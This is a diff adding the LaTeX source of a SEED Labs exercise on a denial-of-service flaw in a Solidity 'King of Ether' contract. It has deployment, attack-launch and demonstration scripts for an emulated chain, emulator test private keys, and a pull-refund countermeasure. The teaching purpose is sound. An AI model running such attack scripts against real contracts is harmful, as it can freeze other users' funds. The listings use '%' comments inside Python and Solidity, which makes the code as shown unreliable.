@@ -1,0 +1,485 @@
+% Including common header, copyright, and Solidity highlighting
+\newcommand{\commonfolder}{../../common-files}
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+\input{\commonfolder/solidity-highlighting.tex}
+
+% Fixing fancyhdr headheight warning
+\setlength{\headheight}{13.6pt}
+
+% Configuring hyperref
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,
+    urlcolor=cyan,
+    pdfborder={0 0 0}
+}
+
+% Setting left header
+\lhead{\bfseries SEED Labs -- Smart Contract King of Ether DoS Attack Lab}
+
+% Defining custom command for pointing up right
+\newcommand{\pointupright}[1]{\ding{218} \textbf{\texttt{#1}}}
+
+\begin{document}
+
+% Creating title page
+\begin{center}
+{\LARGE Smart Contract King of Ether DoS Attack Lab}
+\end{center}
+
+\seedlabcopyright{2025}
+
+% Overview Section
+\section{Overview}
+
+The King of Ether game is a smart contract where participants compete to become the "king" by sending more Ether than the previous king, with the previous king being refunded their Ether. However, a Denial of Service (DoS) vulnerability exists in the contract’s refund mechanism, which uses a \texttt{call} to send Ether to the current king. If the king is a contract without a \texttt{payable} fallback or \texttt{receive} function, the refund fails, preventing others from claiming the throne~\cite{CyfrinDoS}.
+
+This lab provides hands-on experience in exploiting this DoS vulnerability. Students will deploy a vulnerable \texttt{KingOfEther} contract, use an attacker contract to lock the throne, and attempt to claim the throne with another account to demonstrate the failure. The lab is conducted within the SEED Internet Emulator, featuring a deployed Ethereum blockchain. Topics covered include:
+
+\begin{itemize}[noitemsep]
+    \item Denial of Service vulnerability in smart contracts
+    \item Ethereum’s \texttt{call} function and its risks
+    \item Blockchain and smart contract interactions
+    \item The SEED Internet Emulator
+\end{itemize}
+
+\paragraph{Lab environment.}
+\seedenvironmentB
+\nodependency
+We recommend configuring the virtual machine with at least two CPU cores and 4GB of RAM. This lab requires Python 3.12.7 with \texttt{web3.py} version 7.12.1, installed using:
+
+\begin{lstlisting}
+$ pip3 install web3==7.12.1
+\end{lstlisting}
+
+\paragraph{Note to instructors.}
+This lab highlights critical smart contract vulnerabilities related to Ether transfers. Instructors should introduce Ethereum’s \texttt{call} function and DoS concepts in class beforehand. Students can refer to resources like~\cite{CyfrinDoS} for additional context.
+
+% Lab Setup Section
+\section{The Lab Setup and the SEED Internet Emulator}
+\label{sec:labsetup}
+
+\subsection{Emulator}
+
+This lab is performed within the SEED Internet Emulator. New users should review this section carefully. Instructors are encouraged to offer a session to familiarize students with the emulator.
+
+\input{../common-files/emulator.tex}
+
+\paragraph{EtherView.}
+\input{../common-files/etherview.tex}
+
+\subsection{The Client Code}
+
+Students will use Python programs with the \texttt{web3.py} library to interact with the Ethereum network. Wrapper functions are provided in \texttt{SEEDWeb3.py}, located in the \texttt{Labsetup/shared} folder. Install \texttt{web3.py} version 7.12.1 using:
+
+\begin{lstlisting}
+$ pip3 install web3==7.12.1
+\end{lstlisting}
+
+\subsection{Connecting to the Blockchain}
+\label{sec:sub:ports}
+
+To interact with the blockchain, connect to an Ethereum node via HTTP on port 8545 using its IP address. Example:
+
+\begin{lstlisting}
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+\end{lstlisting}
+
+\subsection{Accounts}
+
+Each Ethereum node in the emulator has pre-created accounts with balances. For transactions, we use a funded account with a known private key (\texttt{\scriptsize 6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667}). Access accounts via \texttt{web3.eth.accounts[]}. Example:
+
+\begin{lstlisting}
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+attacker_account = web3.eth.account.from_key(private_key).address
+\end{lstlisting}
+
+Check balances using the provided \texttt{check\_status.py} script, which queries the contract’s state:
+
+\begin{lstlisting}
+web3.eth.get_balance(Web3.toChecksumAddress(address))
+\end{lstlisting}
+
+% Task 1 Section
+\section{Task 1: Getting Familiar with the Vulnerable Smart Contract}
+
+The vulnerable contract, \path{KingOfEther.sol}, is a game contract where users become the king by sending more Ether than the current balance, with the previous king refunded. Find it at \path{Labsetup/contract/KingOfEther.sol}:
+
+\begin{lstlisting}[language=Solidity, caption = The vulnerable contract (\texttt{KingOfEther.sol})]
+% SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract KingOfEther {
+    address public king;
+    uint256 public balance;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
+        
+        % Refund the previous king
+        (bool sent, ) = king.call{value: balance}("");
+        require(sent, "Failed to send Ether");
+        
+        balance = msg.value;
+        king = msg.sender;
+    }
+}
+\end{lstlisting}
+
+Key functions:
+\begin{itemize}
+    \item \texttt{claimThrone}: Allows a user to become the king by sending more Ether than \texttt{balance}. The previous king is refunded via \texttt{call}, which fails if the king is a contract without a \texttt{payable} fallback or \texttt{receive} function.
+\end{itemize}
+
+\subsection{Task 1.a: Compiling the Contract}
+
+Download the Solidity compiler binary (\texttt{solc-static-linux}) for version 0.8.26 from:
+
+\begin{lstlisting}
+https://github.com/ethereum/solidity/releases/download/v0.8.26/solc-static-linux
+\end{lstlisting}
+
+Compile \texttt{KingOfEther.sol} and \texttt{KingOfEtherAttack.sol} using:
+
+\begin{lstlisting}
+chmod +x solc-static-linux
+./solc-static-linux --overwrite --abi --bin -o . KingOfEther.sol
+./solc-static-linux --overwrite --abi --bin -o . KingOfEtherAttack.sol
+\end{lstlisting}
+
+This generates \texttt{KingOfEther.abi}, \texttt{KingOfEther.bin}, \texttt{KingOfEtherAttack.abi}, and \texttt{KingOfEtherAttack.bin} in the \texttt{Labsetup/contract} folder.
+
+\subsection{Task 1.b: Deploying the Vulnerable Contract}
+
+Deploy using \texttt{deploy\_victim\_contract.py} in \path{Labsetup/victim} with the funded account’s private key:
+
+\begin{lstlisting}[language=python, caption={Deploying the contract (\texttt{deploy\_victim\_contract.py})}]
+#!/bin/env python3
+
+from web3 import Web3
+import os
+import sys
+
+% Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+% Paths to ABI and bytecode files
+abi_file = "../contract/KingOfEther.abi"
+bin_file = "../contract/KingOfEther.bin"
+
+% Connect to a geth node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+% Private key and derived account
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+
+print("Deploying KingOfEther contract...")
+addr = SEEDWeb3.deploy_contract(web3, private_key, abi_file, bin_file, None)
+print(f"Victim contract deployed at: {addr}")
+with open("contract_address_victim.txt", "w") as fd:
+    fd.write(addr)
+\end{lstlisting}
+
+Save the contract address from the output to \texttt{contract\_address\_victim.txt}.
+
+\subsection{Task 1.c: Deploying the Attacker Contract}
+
+Deploy the attacker contract using \texttt{deploy\_attack\_contract.py} in \path{Labsetup/attacker}, providing the victim contract’s address:
+
+\begin{lstlisting}[language=python, caption={Deploying the attacker contract (\texttt{deploy\_attack\_contract.py})}]
+#!/bin/env python3
+
+from web3 import Web3
+import os
+import sys
+
+% Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+% Paths to ABI and bytecode files
+abi_file = "../contract/KingOfEtherAttack.abi"
+bin_file = "../contract/KingOfEtherAttack.bin"
+
+% Read victim contract address
+with open("contract_address_victim.txt", "r") as fd:
+    victim_addr = "put address here"
+
+% Connect to a geth node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+% Private key and derived account
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+
+print(f"Deploying Attack contract targeting KingOfEther at {victim_addr}...")
+addr = SEEDWeb3.deploy_contract(web3, private_key, abi_file, bin_file, victim_addr)
+print(f"Attack contract deployed at: {addr}")
+with open("contract_address_attack.txt", "w") as fd:
+    fd.write(addr)
+\end{lstlisting}
+
+Update \texttt{victim\_addr} with the address from \texttt{contract\_address\_victim.txt}.
+
+\subsection{Task 1.d: Checking Initial State}
+
+Use \texttt{check\_status.py} in \path{Labsetup/attacker} to verify the initial king and balance:
+
+\begin{lstlisting}[language=python, caption={Checking contract state (\texttt{check\_status.py})}]
+#!/usr/bin/env python3
+
+from web3 import Web3
+import os
+import sys
+
+% Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+% Path to ABI file
+abi_file = "../contract/KingOfEther.abi"
+
+% Address of the deployed victim contract
+victim_addr = "put address here"
+
+% Connect to Geth PoA node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+% Load ABI and contract
+contract_abi = SEEDWeb3.getFileContent(abi_file)
+contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
+
+% Get current king and balance
+current_king = contract.functions.king().call()
+current_balance = contract.functions.balance().call()
+
+% Print status
+print(f"Current King: {current_king}")
+print(f"Current Throne Balance: {current_balance} wei ({web3.from_wei(current_balance, 'ether')} ETH)")
+\end{lstlisting}
+
+\paragraph{Lab task:} Deploy both contracts and verify the initial king (should be the zero address) and balance (0 ETH).
+
+% Task 2 Section
+\section{Task 2: Launching the DoS Attack}
+
+To exploit the DoS vulnerability, use the \texttt{KingOfEtherAttack} contract to claim the throne. The attacker contract lacks a \texttt{payable} \texttt{receive} function, causing subsequent \texttt{claimThrone} calls to fail. Execute the attack with \texttt{launch\_attack.py} in \path{Labsetup/attacker}:
+
+\begin{lstlisting}[language=python, caption={Launching the attack (\texttt{launch\_attack.py})}]
+#!/usr/bin/env python3
+
+from web3 import Web3
+import sys
+import os
+
+% Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+% Connect to the Geth PoA node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+% Attacker's private key and account
+private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
+attacker_account = web3.eth.account.from_key(private_key).address
+
+% Load ABI and attack contract
+abi_file = "../contract/KingOfEtherAttack.abi"
+attack_addr = "put address here"
+
+contract_abi = SEEDWeb3.getFileContent(abi_file)
+contract = web3.eth.contract(address=attack_addr, abi=contract_abi)
+
+% Amount to send (e.g., 1 Ether)
+attack_value = web3.to_wei(1, 'ether')
+
+% Send the attack transaction
+print("Launching DoS attack...")
+nonce = web3.eth.get_transaction_count(attacker_account)
+
+transaction = contract.functions.attack().build_transaction({
+    'from': attacker_account,
+    'value': attack_value,
+    'nonce': nonce,
+    'gas': 500000,
+    'gasPrice': web3.to_wei('10', 'gwei'),
+    'chainId': 1337
+})
+
+signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
+tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+print("Transaction sent, waiting for block confirmation...")
+tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+
+print(f"Attack completed. Transaction Hash: {tx_hash.hex()}")
+print("Transaction Receipt:")
+print(tx_receipt)
+\end{lstlisting}
+
+Update \texttt{attack\_addr} with the address from \texttt{contract\_address\_attack.txt}.
+
+% Task 3 Section
+\section{Task 3: Demonstrating the DoS Attack}
+
+Attempt to claim the throne with another account using \texttt{attempt\_claim\_throne.py} in \path{Labsetup/victim} to demonstrate the failure:
+
+\begin{lstlisting}[language=python, caption={Attempting to claim throne (\texttt{attempt\_claim\_throne.py})}]
+#!/usr/bin/env python3
+
+from web3 import Web3
+import os
+import sys
+
+% Add the shared folder to sys.path
+sys.path.append(os.path.abspath("../shared"))
+
+import SEEDWeb3
+
+% Connect to the Geth PoA node
+web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')
+
+% Path to ABI file
+abi_file = "../contract/KingOfEther.abi"
+
+% Address of the deployed victim contract
+victim_addr = "put address here"
+
+% Load ABI and contract
+contract_abi = SEEDWeb3.getFileContent(abi_file)
+contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
+
+% Choose a non-attacker account to attempt to claim the throne
+challenger_account_private_key = "ec2c9e1284e00fed6361a4fd4953cca003b557830e6431b18205ee350c25fb37"
+challenger_account = web3.eth.account.from_key(challenger_account_private_key).address
+
+% Get current balance and king
+current_balance = contract.functions.balance().call()
+current_king = contract.functions.king().call()
+
+% Attempt to claim the throne with more Ether than current balance
+value_to_send = current_balance + web3.to_wei(1, 'ether')
+print(f"Attempting to claim throne with {web3.from_wei(value_to_send, 'ether')} ETH from {challenger_account}...")
+
+try:
+    nonce = web3.eth.get_transaction_count(challenger_account)
+    transaction = contract.functions.claimThrone().build_transaction({
+        'from': challenger_account,
+        'value': value_to_send,
+        'nonce': nonce,
+        'gas': 500000,
+        'gasPrice': web3.to_wei('10', 'gwei'),
+        'chainId': 1337
+    })
+
+    signed_tx = web3.eth.account.sign_transaction(transaction, challenger_account_private_key)
+    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+
+    if tx_receipt['status'] == 1:
+        print(f"Transaction successful! Hash: {tx_hash.hex()}")
+        print("Unexpected: Transaction succeeded!")
+    else:
+        raise Exception(f"Transaction reverted! Hash: {tx_hash.hex()}")
+
+except Exception as e:
+    print(f"Failed to claim throne: {str(e)}")
+    print("The DoS attack prevents others from becoming king.")
+
+% Verify current king and balance
+print("\n---------------------------------------------------------")
+print("Verifying current king and balance after the attack...")
+current_king = contract.functions.king().call()
+current_balance = contract.functions.balance().call()
+
+print(f"Current King: {current_king}")
+print(f"Current Throne Balance: {current_balance} wei ({web3.from_wei(current_balance, 'ether')} ETH)")
+\end{lstlisting}
+
+Update \texttt{victim\_addr} with the address from \texttt{contract\_address\_victim.txt}.
+
+Steps:
+\begin{enumerate}
+    \item Deploy \texttt{KingOfEther} using \texttt{deploy\_victim\_contract.py}.
+    \item Deploy \texttt{KingOfEtherAttack} using \texttt{deploy\_attack\_contract.py}.
+    \item Run \texttt{launch\_attack.py} to make the attacker contract the king.
+    \item Run \texttt{check\_status.py} to verify the attacker contract is the king.
+    \item Run \texttt{attempt\_claim\_throne.py} to show that another account cannot claim the throne.
+\end{enumerate}
+
+\paragraph{Lab task:} Execute the attack and demonstrate the failure of a new account to become king. Use \texttt{check\_status.py} to confirm the attacker contract remains the king.
+
+% Task 4 Section
+\section{Task 4: Countermeasures}
+
+Prevent the DoS attack by:
+\begin{itemize}
+    \item Using a pull-based refund system where users withdraw Ether themselves.
+    \item Avoiding reliance on \texttt{call} for Ether transfers.
+    \item Validating recipient addresses to ensure they can receive Ether.
+\end{itemize}
+
+Example with a pull-based system:
+\begin{lstlisting}[language=Solidity]
+% SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract SafeKingOfEther {
+    address public king;
+    uint256 public balance;
+    mapping(address => uint256) public pendingRefunds;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
+        
+        % Store refund for previous king
+        if (king != address(0)) {
+            pendingRefunds[king] += balance;
+        }
+        
+        balance = msg.value;
+        king = msg.sender;
+    }
+
+    function withdrawRefund() external {
+        uint256 amount = pendingRefunds[msg.sender];
+        require(amount > 0, "No refund available");
+        pendingRefunds[msg.sender] = 0;
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+\end{lstlisting}
+
+\paragraph{Lab task:} Modify \texttt{KingOfEther.sol} to use a pull-based refund system, redeploy, and attempt the attack again. Report whether the exploit succeeds.
+
+% Submission Section
+\section{Submission}
+
+Submit a report with:
+\begin{itemize}
+    \item Screenshots/logs of contract deployment.
+    \item Screenshots/logs of attack execution and failed throne claim.
+    \item Explanation of the DoS mechanism.
+    \item Countermeasure implementation and results.
+\end{itemize}
+
+% Acknowledgment Section
+\section*{Acknowledgment}
+
+This lab was developed with assistance from Muhammad Jamshaid Ghaffar, a final-year undergraduate Computer Science student in the Department of Computing at the National University of Sciences and Technology (NUST). The SEED project is supported by grants from the US National Science Foundation and Syracuse University.
+
+% Bibliography
+\begin{thebibliography}{90}
+\bibitem{CyfrinDoS}
+Cyfrin, "Denial of Service Hack Solidity Code Example",
+\url{https://www.cyfrin.io/glossary/denial-of-service-hack-solidity-code-example}
+\end{thebibliography}
+
+\end{document}
